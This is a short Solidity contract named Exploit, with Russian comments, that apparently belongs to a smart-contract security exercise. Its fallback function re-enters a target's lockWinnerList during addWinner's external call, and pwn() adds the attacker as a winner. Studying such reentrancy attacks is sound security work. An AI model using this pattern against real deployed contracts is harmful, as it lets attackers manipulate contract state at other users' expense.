// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

interface IWinnerList {
    function lockWinnerList() external;
    function addWinner(address winner) external;
}

contract Exploit {
    IWinnerList public winnerList;

    constructor(address _target) {
        winnerList = IWinnerList(_target);
    }

    // fallback вызовется внутри .call("") из addWinner
    fallback() external payable {
        winnerList.lockWinnerList(); // Включаем lock=true
    }

    function pwn() external {
        winnerList.addWinner(address(this)); // Добавляем себя в winners
    }
}
